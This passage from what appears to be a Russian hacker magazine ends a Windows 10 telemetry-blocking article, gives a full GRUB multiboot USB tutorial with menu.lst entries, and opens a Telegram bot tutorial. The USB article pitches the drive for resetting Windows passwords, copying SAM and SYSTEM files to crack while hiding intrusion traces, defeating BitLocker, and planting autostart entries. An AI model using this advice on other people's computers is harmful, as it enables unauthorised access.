ковой системы Bing. Если бы в тесте был сделан хоть один поисковый запрос
(даже локальный), тогда соединение не вызывало бы никаких возражений. Од-
нако мы просто сидели и смотрели в TCPView на то, как компьютер начинает
шпионить за нами.
ПОДГОТОВКА К ПАКЕТНОМУ ШТОРМУ
Спящие службы можно ждать долго. Пора пробудить их и проявить немного ак-
тивности. Нажатие кнопки «Пуск» заставило ожить инфоблоки справа. Появил-
ся прогноз погоды, начали отображаться новости и реклама. TCPView показы-
вает, что все это грузится через сеть Akamai и выглядит легитимно. Как только
мы запускаем блокнот и начинаем набирать текст, картина сразу меняется.





BingBot попался





Запущен только блокнот

Возникает сразу шесть соединений, которые быстро закрываются, — в сумме
уходит чуть больше сотни пакетов. Отключив функцию «искать в интернете», мы
оставили только локальный поиск Windows. Снова запустили блокнот и начали
набирать произвольный текст. Все равно появился процесс SearchUI и стал пе-
редавать данные в Сеть.
Поиск в интернете отключен

Наверное, мы как-то не так поняли «Заявление о конфиденциальности». По-
смотрим его еще раз. Это простая текстовая страничка, которая открыва-
ется в браузере Edge. Какой она может создать трафик? Примерно такой,
как на картинке.





Открыта одна страница в браузере


Перечень соединений настолько быстро обновлялся, что просто так и не усле-
дишь. Поэтому мы приступили ко второй части исследования. Закрыли все при-
ложения, поставили снифер Wireshark и записали активность Windows за пол-
часа. Чтобы сымитировать хоть какую-то деятельность, мы просто смотрели
некоторые настройки в панели управления, но не меняли их.
Windows передает непрерывно — неважно, делаешь что-то или нет





За полчаса нашего бездействия Windows успела разослать отчеты по всему свету
За полчаса в Сеть ушло около восьми тысяч пакетов. Как показало изучение ло-
гов, большинство соединений устанавливалось по адресам в пределах одной
из крупных подсетей. У принадлежащих им айпишников часто менялись два-
три последних октета. Это говорит о том, что Microsoft развернула огромную
сеть для обработки всей стекающейся от пользователей Windows информа-
ции. Если отсеять однотипные адреса, то в сухом остатке получится подборка,
как на картинке.
  В глаза бросается бразильский сервер, это очередной BingBot (возможно,
какой-то особо специализированный), но вопросы вызывает далеко не толь-
ко он. Например, какого черта выполнялось соединение с сервером Facebook
в Нидерландах? Кто просил подключаться к облачному хранилищу CloudFlare?
Ни одного файла еще не создано. Даже учетная запись Microsoft не была акти-
вирована.

ВСКРЫВАЕМ ШПИОНСКУЮ СЕТЬ
После поиска Bing главная шпионка в Windows — Кортана. С ней как-то сра-
зу сложились натянутые отношения. Сперва она сама настояла на знакомстве,
а затем вдруг заявила, что не понимает русскую речь и даже учиться этому
не собирается.

                                                                      Кортана
                                                                  привыкла
                                                                       знакомиться
                                                                     первой
Даже сменив язык на английский, а регион на США, мы так и не добились ее
расположения. В базе знаний Microsoft об этом говорится просто: установи-
те соответствующее исправление через службу обновлений. Жаль только, что
пользователь теперь лишен возможности ставить апдейты по своему усмотре-
нию. Они скачиваются и устанавливаются Windows автоматически. Юзер может
выбрать лишь отмену перезагрузки и задать отложенную инсталляцию.





BingBot попался

Большая часть скрытого трафика Windows идет через сеть доставки контента
Akamai, поэтому не отображается в логах HTTP-прокси. Однако это не значит,
что смотреть их бесполезно. Запустив Fiddler, можно обнаружить интересные
вещи. Например, выяснить, что идентификация пользователя происходит еще
до активации установленной копии Windows.
Фрагмент лога HTTP-прокси


При взгляде на окно Fiddler видно характерную форму /usercard/?id=, обра-
щения к учетной записи через службу Microsoft Live и многое другое. Откуда взя-
лись запросы к visualstudio.com и социальным сервисам Microsoft — загадка.





Fiddler собрал 29 веб-адресов
Трафик по HTTP за полчаса без-
действия   оказался   настолько
большим, что стало проблемой
наглядно отобразить его на экра-
не. Мы сделали пару скриншотов,
а затем составили список засве-
тившихся хостов. Можно бы сра-
зу занести их в файл hosts, но мы
пока отложим это, чтобы не нару-
шать ход эксперимента.
  Из этого списка ожидаемым вы-
глядит только URL windowsupdate.
com, который мы не стали вклю-
чать в список блокировки. Соглас-
но журналу установки, за все вре-
мя эксперимента автоматически
было инсталлировано 21 обнов-
ление общим объемом около 150
Мбайт. В ходе теста, кроме блок-
нота, мы запускали только кальку-
лятор и свои утилиты для анали-
за активности Windows, в которых
было отключено автообновление.
При этом общий сетевой трафик
превысил полгигабайта. Многова-
то для «служебных данных, соби-
                                      Улов Fiddler кормит localhostраемых в целях улучшения впечат-
ления от работы программ»!
Полгига данных утекли в Сеть


Впечатление оказалось сильно испорченным. Следящих
функций в Windows 10 действительно чересчур много. От-
ключение интегрированного поиска и увольнение Кортаны
помогает лишь отчасти. «Защитник Windows» отправляет                                                        INFO
в Microsoft образы файлов, которые сочтет подозритель-
                                                              В последнее времяными или вредоносными. Фильтр SmartScreen не толь-                                                                                        Microsoft пытается
ко проверяет веб-контент, но и формирует список посе-       научить прежние
щенных страниц. Журнал местоположений протоколирует     версии ОС Windows
                                                                         шпионить так же,
все физические перемещения (особенно актуально, если                                                                                   как это делает «де-
Windows 10 установлена на мобильном устройстве). Отчет      сятка». В частности,
                                                                       следящие функциио взаимодействии с пользователем отсылают и многие                                                                             добавятся с обнов-
приложения в новом стиле, а в разделе «данные диагно-     лениями KB3075249
стики и использования» вообще нельзя запретить отправку       и KB3080149.
отчета — можно лишь выбрать менее подробный вариант.

УХОД В ОФЛАЙН
Мы решили полностью отключить все узаконенные средства шпионажа штатны-
ми средствами Windows. В основном настройки меняются через вкладки «Кон-
фиденциальность», «Поиск» и «Обновление и безопасность» в панели управ-
ления. Переключателей там с полсотни, вот только будет ли от них толк?
  Мы отключили все, что только можно, и запустили Wireshark снова. На этот
раз не пользовались никакими встроенными приложениями и даже не трогали
мышку. Вернувшись через час, видим в логах снифера до боли знакомые IP.
Змея меняет кожу, но не меняет нрава

Прогресс есть. Общее число запросов уменьшилось на порядок. Примерно
втрое сократилось и число удаленных узлов, к которым выполняется подключе-
ние без ведома пользователя. Однако среди них появились новые. Если в пер-
вом логе Wireshark внезапно нашелся сервер Facebook, то теперь засветился
дата-центр Amazon из Ирландии.





Ряды шпионов поредели

Раз уж Fiddler помог добыть список IP, то их массовое добавление в файл hosts
должно помочь прекратить слежку. Проверим, создав список блокировки,
и снова запустим Wireshark.
Скромный улов Wireshark

По сравнению с первым логом этот выглядит скучно. На экране не уместил-
ся только один айпишник, а их общий список состоит всего из четырех. Два
из них относятся к сети доставки контента и не могут эффективно блокировать-
ся в hosts — слишком много подсетей принадлежит Akamai. Третий IP-адрес
принадлежит службе Windows Update, которую не блокировали. Самым стой-
ким шпионом оказался BingBot. Его связь с бразильской Microsoft Informatica
не знает преград. Видимо, процесс содержит встроенные средства обхода
ограничений.

ДОБИВАЕМ АГЕНТОВ МАТРИЦЫ
Справиться с оставшимися агентами Microsoft помогает ряд дополнительных
мер. Нужно задать в брандмауэре блокировку подключений ко всем IP-адре-
сам, выявленным Wireshark. У нас их получилось 47, но наверняка при более
длительном мониторинге список увеличится. Еще есть шанс, что при очеред-
ном автоматическом обновлении в системных файлах пропишутся новые ай-
пишники, но пока вместе с модификацией файла hosts это обеспечивает боль-
шую часть защиты от слежки.
   Отключить «неотключаемые» функции можно через реестр.
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DataCollection
Задав нулевое значение этому параметру, запретим отправку «технических»
данных.
   Желательно удалить файл сервиса DiagTrack с уже собранными данными.
Вот путь к нему.

C:\ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\
    AutoLogger-Diagtrack-Listener.etl

Отключить сами сервисы DiagTrack и dmwappushsvc можно через управление
службами или ветку реестра.

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\

В планировщике заданий стоит посмотреть очередь задач
и отключить все регулярные отправки данных, если они еще
остались.
   Рекомендуется  деинсталлировать  облачный  клиент
OneDrive, если ты все равно не собирался им пользоваться.
  Все эти действия можно выполнить вручную, но сэконо-
                                   WWW
мить время сильно помогает утилита DisableWinTracking. В от-
личие от многих аналогов, она распространяется с открытым     Статья чешского
                                                                               обозревателяисходным кодом и хорошо документирована.                                                                          со списком следящих
   После выполнения всех описанных действий Windows      подключений
10 лишилась шпионских привычек. Вместе с ними, правда,
                                                                           Бесплатная утилита
исчезли почти все новые фишки, которые призваны повы-                                                                                                IPNetInfo
сить удобство работы и обеспечить безопасность. Впрочем,
                                                                    Снифер Wiresharkкак говорил Франклин: «Те, кто готовы пожертвовать насущ-                                                                             для Windows
ной свободой ради малой толики временной безопасности,
не достойны ни свободы, ни безопасности».
 PCZONE
МАСТЕР-КЛЮЧ


                                                                                        84ckf1r3
                                                                                               84ckf1r3@gmail.comКО ВСЕМ
КОМПЬЮТЕРАМ
 СОЗДАЕМ МУЛЬТИЗАГРУЗОЧНУЮ ФЛЕШКУ
 С НАБОРОМ ПОЛЕЗНОСТЕЙ
Мультизагрузочный накопитель помо-
гает выполнять проверку железа, го-
товить компьютеры к установке ОС,
бэкапить данные и удалять любые
зловреды. А также ломать пароли и ко-      WARNING
                                                                  Ошибки при работепаться в системе сколько душе угодно.                                                                              с GRUB и многими
                                                                             утилитами могут
Когда в BIOS появилась опция загрузки с USB-накопи-        привести к утрате
                                                                            данных или
телей, жизнь хакеров навсегда изменилась. С тех пор                                                                           невозможности
при помощи крохотного устройства за любым компьюте-       загрузить ОС. Делай
                                                                             бэкапы! Ни редакция,ром стало можно делать что угодно, не вскрывая его кор-                                                                          ни автор не несут
пус и не привлекая внимания. Получить полный контроль        ответственности
над системой можно, только выйдя за ее пределы.               за любой возможный
                                                                                       вред.

MULTIBOOT
Сегодня с флешки может загрузиться практически любая операционка. Мно-
гие ОС вообще создают слой аппаратных абстракций HAL прямо в процессе
инсталляции или тестовой установки на RAM drive. Начиная с Windows XP до-
ступна удобная среда предустановки — WinPE. Сейчас она доросла до версии
5.1 и базируется на Windows Kits 8.1 Update. После некоторых модификаций
WinPE позволяет делать почти все то же, что и установленная Windows. Напри-
мер, устанавливать драйверы не только в процессе загрузки, но и после нее.
  Приверженцы «старой школы» наверняка оценят FreeDOS. Она достаточно
всеядна — ей подойдет любая платформа x86. В этой операционке доступны
даже браузер и медиаплеер. Современные дистрибутивы Linux легко запуска-
ются в режиме Live, а некоторые даже имеют функцию сохранения изменений
после перезагрузки — USB persistence. Многие программы для восстановле-
ния данных и антивирусной защиты сами создают образы загрузочных дисков,
которые можно поместить на флешку. Словом, выбор компонентов для мульти-
загрузки очень большой.
   Загрузившись в режиме WinPE, ты сможешь с помощью соответствующих ути-
лит менять в установленной ОС Windows пароли, системные файлы и настрой-
ки реестра, которые заблокированы даже для админа. Системы со сквозным
шифрованием и дополнительной защитой так просто не одолеть, но рядовой
домашний или офисный компьютер — легко. Отдельные программы позволяют
получить полный контроль над железом, также невозможный в обычных усло-
виях из-за ограничений на уровне прав, драйверов и служб. Весь этот набор
инструментов часто записывают на разные носители, поскольку они отличают-
ся по требованиям и конфликтуют друг с другом, но есть способы объединить
многие из них в универсальную сборку. Этим мы и займемся.
  Нам понадобятся:
•  флешка емкостью от 8 Гбайт;
•  загрузчик GRUB;
•  набор образов с желаемыми программами и операционными системами;
•  утилита WinContig;
•  программа WinSetupFromUSB (опционально).

От живых CD к ожившим флешкам

Мультизагрузку можно сделать и на CD/DVD, но это устаревший неудобный ва-
риант. Одного DVD-R(W) мало на что хватает. Приходится делить сборку на ча-
сти и носить пачку дисков. Файлы на них нельзя перезаписывать в процессе
работы. На время сеанса все помещается в виртуальный раздел (RAM drive),
который тоже не резиновый. К тому же обычно требуется сохранить что-то
именно на физическом разделе.
   Обновилась версия программы или база антивируса — приходится пере-
собирать и прожигать заново весь образ. Скорость чтения получается низкая,
особенно когда нужно запускать портативные утилиты и считывать много мел-
ких файлов. Надежность современных DVD не выдерживает критики, а в нетто-




КАК ВЫБРАТЬ ФЛЕШКУ ДО ПОКУПКИ
В первую очередь стоит исходить из того, что на флешке с мультизагрузкой
и портативным софтом будет перезаписываться большой объем данных, поэ-
тому важна как скорость ее работы, так и ресурс. Найти соответствующую ин-
формацию помогут обзоры и отзывы, но помни про маркетинговую хитрость:
внутри двух одинаковых с виду флешек могут стоять разные чипы памяти и даже
разные контроллеры. Поэтому смотрим только свежие тесты.
   Для создания мультизагрузочной флешки лучше выбрать модель с металли-
ческим корпусом. Он лучше рассеивает тепло, а в интенсивной работе его бу-
дет выделяться много — отдельные операции выполняются часами. По той же
 причине стоит выбирать модели с крупным корпусом — у него больше площадь
 рассеивания и выше шанс, что внутри объем занят чем-то полезным.
   Может возникнуть желание записать на флешку как можно больше, но за ре-
кордными объемами гнаться не стоит. Очень вероятно, что возникнут пробле-
мы при загрузке на старых компьютерах, да и накопитель с меньшей емкостью
обычно работает надежнее. Самые жадные до объемов могут в тех же целях
 использовать внешний винчестер.

Для самых запасливых

Вместо флешки можно использовать любой другой внешний накопитель. Им
может быть карта памяти, внешний жесткий диск или даже старый SSD. С кар-
точки удобно загружать ноутбук — USB останется свободным. Внешний вин-
честер обрадует желающих носить с собой весь набор программ. На него же
можно записывать резервные копии, разворачивать бэкапы для тестов и уста-
навливать дополнительные ОС — места много не бывает.



КАК ВЫБРАТЬ ФЛЕШКУ ИЗ ИМЕЮЩИХСЯ
 Узнать наверняка, что находится внутри конкретной флешки, можно только по-
 сле покупки. Обойтись без вскрытия ее корпуса помогает база данных iFlash
и утилиты для идентификации по VID/PID. Среди многих аналогов бесплат-
 ная утилита Flash Drive Information Extractor производства компании ANTSpec
 Software — единственная, корректно работающая с USB 3.0 и новыми контрол-
 лерами.
   Каждая перезапись уменьшает ресурс памяти, поэтому модели с чипами
TLC лучше не использовать. Современные чипы NAND MLC делятся по ресурсу
 на два класса: 3K (до 3000 циклов перезаписи) и 5K (до 5000 циклов перезапи-
 си). Последние ставят в дорогие SSD, и обнаружить такой чип внутри флешки
 маловероятно. Память SLC с ресурсом до ста тысяч циклов и сейчас выпуска-
 ется только для SSD корпоративного класса и буферов гибридных накопите-
 лей. Флешки с такой памятью перестали делать много лет назад.
Найти сегодня флешку с SLC так же сложно, как цветок папоротника

В окне Flash Drive Information Extractor отображается тип чипов памяти, их пред-
положительный производитель и максимальная сила тока. По ней можно су-
дить о потребляемой мощности, а значит — прогнозировать степень нагрева
флешки и ее способность длительно работать в проблемных условиях. На заре
производства USB-Flash они оснащались качественным термоинтерфейсом,
схемой стабилизации питания, защиты от помех и даже от переполюсовки. Со-
временные модели, как правило, совершенно беззащитны. Теперь флешки —
это не высокие технологии, а расходный материал.

GRUB — GRAND UNIFIED BOOTLOADER
Загрузчик GRUB далеко не единственный, но очень
удобный вариант создания мультизагрузки. Он универ-
сален, поддерживает как старые, так и все современ-
                                                       INFOные технологии загрузки. К тому же синтаксис команд
для других загрузчиков (в частности, Syslinux) легко пе-     Некоторые старые ком-
реписывается в строчки меню GRUB.                        пьютеры не поддержива-
                                                                ют загрузку с USB-нако-
  GRUB, как и многие опенсорсные проекты, за годы                                                                           пителей, хотя и оснащены
своего существования разделился на разные вари-      портами USB. Исполь-
                                                                             зовать на них мульти-анты. Есть WinGRUB, Grub2Win, GRUB4DOS и прочие                                                                          загрузочную флешку
форки. Наиболее простой и безопасный для нашей за-       можно при помощи
дачи — Grub4DOS USB Installer, написанный на Visual     своеобразного костыля —
                                                                  менеджера загрузки
C++ в конце 2012 года. Эвристический анализатор не-                                                                  PLoP на загрузочном CD.
которых антивирусов может на него ругаться из-за ис-     Процесс загрузки начи-
                                                                          нается с него и уже затемпользования API DeviceIOControl, необходимой для за-                                                                       перенаправляется в меню
писи бут-сектора. Подробнее смотри отчет VirusTotal.             на флешке.
   Превратить флешку в мультизагрузочную сегодня крайне просто — ручные
операции сведены к минимуму, есть множество готовых утилит, отработанных
методик, и давно реализована поддержка новых файловых систем. Если нет
нужды работать с чистым досовским окружением и старыми программами не-
посредственно на разделе флешки, то можно смело форматировать ее в NTFS.
Для установки Windows 8, 8.1, 10 и некоторых других операций это вообще обя-
зательное условие. Изначально все флешки продаются с разделом FAT32. Со-
здать раздел NTFS может сам инсталлятор GRUB — главное, не ошибиться
при выборе диска. Предварительно нужно очистить флешку, переписав все
данные на другой носитель.
   Теперь остается выбрать ее
из списка в окне Grub4DOS USB
Installer и нажать «Установка». Че-
рез несколько секунд все опера-
ции будут завершены, подтверж-
дением чему станет файл menu.lst
в корне флешки. Это лишь пример
меню, который мы скоро будем
править.

СОЗДАЕМ НАБОР
                                     Установка GRUB на флешку одним кликомПеред началом работы советую
прочесть статью полностью и за-
ранее скачать все необходимое по указанным в тексте ссылкам. Каждая из них
была проверена, как и процедура мультизагрузки. Начнем с простого: скача-
ем программу для диагностики оперативной памяти MemTest86 Free (подроб-
ности смотри в статье «Железная надежность»). Ее целесообразно поместить
сверху списка будущего меню, так как первый пункт выбирается автоматиче-
ски через несколько секунд. Если пропустишь момент, то просто нажмешь Esc,
избегая долгого ожидания загрузки чего-то более тяжелого. Для современных
компьютеров с DDR4 понадобится версия 6.1.0 или новее. Она же включает
релиз 4.3.7, который автоматически загрузится при определении старых типов
памяти.
   Утилиту можно найти на официальном сайте PassMark и запускать с одной
флешки вместе с последней версией MemTest86+. Это форк, который прекра-
тил развитие, но до сих пор имеет некоторые преимущества.
Утилита MemTest с автозагрузкой версии для старых типов памяти

ЗАПИСЫВАЕМ СВОЕ МЕНЮ
Открываем файл menu.lst «Блокнотом» и пишем строки:

timeout=20
default 0
splashimage (hd0,0)/Boot/gfx/cooltheme.xpm

Первая строка задает время ожидания выбора пункта в секундах. Если ничего
не выбрано, то автоматически загружается пункт, указанный во второй строчке.
Третья строка — путь до картинки в формате XPM, на фоне которой отобража-
ется меню. Далее идут непосредственно вызовы других загрузчиков для запу-
ска разных утилит и операционок. Название каждого пункта произвольное и за-
писывается после ключевого слова title. Затем указывается метод загрузки
и путь до образа ISO относительно корня флешки. Подробнее синтаксис рас-
сматривается в объемном руководстве.
title MemTest86 v.6.1.0
map /img/MemTest86-610.iso (0xFF)
map --mem /img/MemTest86-610.iso (0xFF)
map --hook
chainloader (0xFF)

Здесь и далее все образы будут размещаться в каталоге /img/, но можно ука-
зать любой путь (желательно покороче). Аналогично прописываем загрузку
MemTest86+.

title MemTest86+ v.5.01
map /img/MemTest86p-501.iso (0xFF)
map --mem /img/MemTest86p-501.iso (0xFF)
map --hook
chainloader (0xFF)

Меняется только название и ссылка на образ, однако далеко не все ISO мож-
но загружать таким простым методом. Зато, помимо ISO, на флешку можно
поместить образы в формате IMA. Ради эксперимента добавим набор утилит
от Active@, среди которых есть программа для сброса пароля любой учетной
записи и разблокировки аккаунтов в Windows. В среде WinPE она работает
с Windows от версии 2000 до 8.1 включительно, а также Windows Server (2000–
2012). Релиз для DOS гораздо старее и официально поддерживает только
сброс паролей в XP, хотя файлы SAM порой находит и в более свежих версиях
Windows. Скачивается утилита все так же в виде образа ISO, но внутри него есть
файл floppy_2.88.00.ima, который ради экономии места можно извлечь, пере-
именовать и загружать напрямую. Способ здесь уже другой — эмуляция FDD.

title Active@ toolkit with Password Changer
find --set-root /IMG/active.ima
map --mem /IMG/active.ima (fd0)
map --hook
chainloader (fd0)+1
rootnoverify (fd0)
Набор утилит Active@ для DOS запускается с NTFS


Продолжить ностальгировать можно будет позже в среде FreeDOS, а сейчас
мы займемся более актуальными вещами. Интегрируем в мультизагрузку на-
бор средств диагностики и восстановления — Microsoft DaRT. Подписчики про-
граммы Software Assurance могут его создать с помощью комплекта Microsoft
Desktop Optimization Pack, а остальные — попросить у знакомого админа или
найти в интернете. Получив образ, просто откроем его и скопируем каталог
\ERDC\ в корень флешки. В меню добавим следующие строчки:

title MS DaRT
map --unmap=0:0xff
map --unhook
root (hd0,0)
chainloader /ERDC/bootmgr
Запуск Microsoft DaRT

Альтернативный вариант — ничего не распаковывать, а загружать версии дис-
ков восстановления x86- и x64-систем прямо из образов, созданных на своем
компьютере:

title Win 7 x86 Recovery
find --set-root /img/W7-x86-Repair.iso
map /img/W7-x86-Repair.iso (hd32)
map --hook
root (hd32)
chainloader (hd32)
title Win 7 x64 Recovery
find --set-root /img/W7-x64-Repair.iso
map /img/W7-x64-Repair.iso (hd32)
map --hook
root (hd32)
chainloader (hd32)
Создание диска восстановления штатными средствами

Способ с распаковкой надежнее и менее требователен к объему оперативной
памяти. Второй способ удобнее и быстрее для интеграции.
   Установка Windows с USB-накопителей имеет свои особенности. Для Windows
7 достаточно скопировать все файлы из образа на флешку (например, с помо-
щью UltraISO) и написать простую команду в меню GRUB:

title Windows 7 Setup
root (hd0,0)
chainloader /bootmgr
boot

Ручная интеграция нескольких установочных дистрибутивов Windows на одной
флешке — тема для отдельной статьи, как и пошаговое создание сборок на ос-
нове WinPE. Здесь же мы возьмем для примера готовые и сосредоточимся
на режиме Live USB.
  На следующем шаге добавим самый универсальный инструмент — сбор-
ку на основе WinPE. Для старых компьютеров подойдет Alkid Live CD, а для но-
вых — Xemom1. Разумеется, можно взять и другие — механизм их загрузки
типовой. Главное, не допускать конфликтов на уровне общих имен каталогов
и разных версий файлов. Например, каталог \BOOT\ встречается во многих
сборках, а \EFI\ нужен для установки последних версий Windows.
   Интеграция Alkid Live CD проходит в три простых этапа. Сначала распаковы-
ваем из образа в корень флешки файлы bootfont.bin и \A386\ntdetect.com, а так-
же каталог \PLOP\. Затем копируем на флешку каталоги \A386\ и \PROGRAMS\
целиком, после чего переименовываем \A386\ в \miniNT\. В меню добавляем
следующие строки:

title Alkid Live USB Full
find --set-root /MININT/setupldr.bin
chainloader /MININT/setupldr.bin





Загрузка Alkid Live USB


Добавление сборок на основе последних версий WinPE происходит подобным
образом. В них всегда есть каталог с образами WIM, который надо скопировать
в корень флешки целиком. В нем же будет находиться загрузчик BOOTMGR.
Его мы и вызовем через меню.

title Win PE 5.0 (Xemom1, unpacked)
find --set-root /W81X/bootmgr
chainloader /W81X/bootmgr





Загрузка WinPE 5.0 с поддержкой 32/64-разрядных систем


ПЕРЕБОРЩИК ПАРОЛЕЙ И KALI LINUX
Установленный локально GRUB сам по себе имеет функцию руткита. Он всег-
да загружается до операционной системы, выполняет заданный набор команд,
а затем вызывает штатный загрузчик ОС либо тот, который ты сам ему укажешь.
  Сброс пароля — быстрый, но грубый метод. Если надо скрыть следы про-
никновения, то придется потрудиться над подбором. Для этого в любом случае
понадобятся файлы SAM и SYSTEM, которые без труда копируются при загруз-
ке с флешки любой операционки, понимающей NTFS. Добавленные в сборку
WinPE утилиты Elcomsoft помогут справиться с защитой BitLocker и другими не-
доразумениями.
   Записав на флешку две версии WinPE, ориентированные на старые (x86,
BIOS, MBR) и новые (x86-64, UEFI, GPT) компьютеры, ты получишь универ-
сальную среду для запуска хакерского софта. Без ограничений установлен-
ной системы можно править файл hosts, подменять драйверы и библиотеки,
а в редакторе реестра — убирать команды автозагрузки хитрых троянов или
добавлять свои.
   Как бы ни была удобна WinPE, у хакера остается масса задач, которые можно
решить только в Linux. Со второй версии в Kali Linux появился удобный инстру-
мент создания кастомных образов ISO — с любыми пакетами, иксами и под-
ключением скриптов в процессе сборки. Как и прежде, их можно запускать
с флешки в режиме Live или Persistence. В документации описано, как записать
Kali на отдельную флешку, а мы добавим его в мультизагрузку.

title Kali 2.0 Lite
set ISO=/img/kali-linux-light-2.0-i386.iso
partnew (hd0,3) 0x00 %ISO%
map %ISO% (0xff) || map --mem %ISO% (0xff)
map --mem --heads=0 --sectors-per-track=0 %ISO% (0xff)
map --hook
root (0xff) || rootnoverify (0xff)
chainloader (0xff)





Варианты загрузки Kali Linux
АНТИВИРУС
Разработчики антивирусов часто предлагают бесплатные образы своих загру-
зочных дисков. Нужны они в первую очередь для избавления от зловредов, уже
поразивших установленную ОС. Если раньше такие образы можно было просто
скачать и добавить на флешку, вызывая их командой map, то сейчас структу-
ра загрузочных дисков сильно усложнилась. Для их гарантированной работы
приходится создавать временные файловые метки, считывать идентификаторы
тома и выполнять кучу проверок. К тому же дисковая подсистема компьютера
может быть сложной, и на очередном этапе загрузчик антивируса потеряется
при сдвиге разделов.





Добавление Kaspersky Rescue Disk через WinSetupFromUSB

   Запись образа с антивирусом на чистую флешку обычно выполняется эле-
ментарно — отдельной программой с сайта разработчика или какой-либо
универсальной утилитой, например UNetbootin. При этом ручное добавление
антивируса в мультизагрузку требует неплохих познаний GRUB, общих навы-
ков программирования и серии тестов. Поэтому мы воспользуемся утилитой
WinSetupFromUSB, которая делает большую часть рутинных операций автома-
тически.
   Здесь надо определиться: будешь ли ты использовать только ее или хочешь
сделать кастомную флешку вручную. Ниже я привожу строки для ручной инте-
грации, но если лень разбираться — просто последовательно добавляй обра-
зы через утилиту. Порядок не имеет значения.





Запуск Kaspersky Rescue Disk с раздела NTFS на мультизагрузочной флешке

   Для примера возьмем образ Kaspersky Rescue Disk. При интеграции образа
его можно поместить вместе с другими (у нас это каталог \img\). В menu.lst до-
бавляем следующие строки:

title KAV Rescue Disk
set /a dev=*0x8280&0xff
root (%dev%,0)
set ISO=/img/kav_rescue_10.iso
map %ISO% (0xff) || map --heads=0 --sectors-per-track=0 %ISO% (0xff)
set /a dev=*0x82a0&0xff
debug 1
parttype (%dev%,3) | set check=
debug off
set check=%check:~-5,4%
if “%check%”==”0x00” partnew (%dev%,3) 0 0 0 &&
    partnew (%dev%,3) 0x00 %ISO%
if not “%check%”==”0x00” echo Error!
map --rehook
root (0xff)
chainloader (0xff)

Теоретически вместо проверок и отладки можно сразу загружать, как в приме-
ре с Kali (partnew (hd0,3) 0x00 %ISO%...), но слегка избыточный вариант записи
обеспечивает лучшую совместимость с разными компьютерами. Программа
WinSetupFromUSB записывает еще больше строк в каждый пункт меню, по-
скольку содержит дополнительные проверки, а также систему вложенных спи-
сков и механизм автонумерации.

УТИЛИТЫ ДЛЯ РАБОТЫ С ДИСКОМ
С загрузочной флешки можно клонировать жесткий диск или восстановить его
из образа. Сделать это можно одной из платных программ или с помощью сво-
бодной утилиты Clonezilla. Если надо запустить ее на компьютере с UEFI, то по-
требуется скачать дистрибутив Clonezilla на основе Ubuntu x64, а не Debian x86.

title Clonezilla
set /a dev=*0x8280&0xff
root (%dev%,0)
set ISO=/img/clonezilla.iso
map %ISO% (0xff) || map --heads=0 --sectors-per-track=0 %ISO% (0xff)
map --rehook
root (0xff)
chainloader (0xff)
Загрузка Clonezilla

Clonezilla уже содержит FreeDOS, поэтому можно не добавлять его отдельным
пунктом.





В состав Clonezilla входит FreeDOS
В конце меню оставим автоматически создаваемые элементы: поиск и загруз-
ку установленной ОС, ее запуск со скрытого раздела, загрузку с оптического
привода, с первого (в BIOS) жесткого диска, выход в режим командной строки
GRUB, перезагрузку и выключение.





Основное меню мультизагрузочной флешки
Перед проверкой созданной флешки необходимо дефрагментировать все за-
писанные в \img\ образы утилитой WinContig, иначе они не будут корректно ра-
ботать при вызове командой map.





Дефрагментация ISO в WinContig
PC ZONE
ТЕЛЕГРАФИРУЕТ
             ПИШЕМ БОТ ДЛЯ
               TELEGRAM НА PYTHONРОБОТ
      то должен уметь хороший робот? Ответ на этот вопрос
      лежит на поверхности. Всякий знает, что по-настояще-
      му хороший робот стремится убить всех людей и унич-Чтожить мир. Но массовые убийства — это, скорее, програм-
ма-максимум. Мы к ним обязательно вернемся, но начинать                                                                                Олег Парамонов
будем с малого.                                                                     paramonov@sheep.ru
   Минимальные требования  к нашему роботу просты.
Во-первых, ему придется делать что-то если и не полезное, то хотя бы реа-
листичное. Телеграммный аналог «Hello, World» нас не устроит хотя бы по той
причине, что три строки кода трудно растянуть на целую статью. Во-вторых, он
должен поддерживать естественное общение хотя бы на уровне Siri. Специ-
альные команды, которые нужно разучивать, и прочее шаманство, напоминаю-
щее командную строку UNIX, не пройдет. В-третьих, его возможности не долж-
ны ограничиваться обменом текстовыми сообщениями. Telegram способен на
большее, и это было бы неплохо показать.
   Возможности веб-фреймворков обычно демонстрируют на примере разра-
ботки блоговых движков. Мы разработаем нечто похожее по сути, но несколько
более персональное: простенький трекер для любителей Quantified Self. Идея
Quantified Self заключается в том, что сбор и анализ данных о самом себе по-
могает заметить тенденции и факты, которые невозможно различить невоору-
женным взглядом. Некоторые виды информации можно отслеживать автомати-
чески при помощи датчиков в фитнес-браслетах, умных часах или смартфонах.
Другие нужно собирать вручную. Существуют, к примеру, приложения для ве-
дения дневника настроений или для хранения данных о съеденной еде (худею-
щим это полезно).
   Ничто не мешает когда-нибудь интегрировать наш трекер с сервисами вроде
 Fitbit, но в данный момент мы ограничимся ручным сбором информации. Попро-
буем сделать мокап интерфейса — разумеется, текстовый. Наш воображаемый
пользователь будет записывать в трекере результаты взвешивания на наполь-
ных весах, прочитанные книги и продолжительность сна. Как? Например, так.

Пользователь: Я вешу 100 кг.
                                                      Робот: Запомнил!
Пользователь: Прочитал «Войну и мир».
                                                      Робот: Запомнил!
Пользователь: Спал шесть часов.
                                                      Робот: Запомнил!

Диалог звучит естественно? Еще как — сложно было бы сказать по-другому.
В то же время в этих сообщениях можно разглядеть смысл и без искусствен-
ного интеллекта. Первое слово, если отбросить местоимение «я» — это всегда
описание действие. Остаток сообщения — объект, на который это действие
направлено. Если же в сообщении есть число, его можно считать количествен-
ной оценкой.
  Информацию нужно не только собирать. Необходимы еще средства для
того, чтобы извлекать и анализировать ее. Попробуем представить естествен-
ный диалог, который позволяет это сделать.

Пользователь: Что я прочитал?
                          Робот: «Войну и мир», «50 оттенков серого»,
                          «В поисках утраченного времени», «Капитал»,
                                                           «Сумерки».
Пользователь: Сколько я спал?
                             Робот: Спал 15 раз. Значения от 4 до 13,
                                            в среднем 6,3. Всего: 77.

Вырисовывается логика. Тут командой служит первое слово: «что» для истории
действия, «сколько» для статистики. Второе слово — это название действия,
которое в записи шло первым. «Я» и вопросительный знак в конце можно игно-
рировать. Очевидно, что такие вопросы сочетаются не с любым действием, но
эту проблему легко решить, предусмотрев список синонимов.
  Идея ясна, можно начинать. Зрители последней серии «Мстителей» знают,
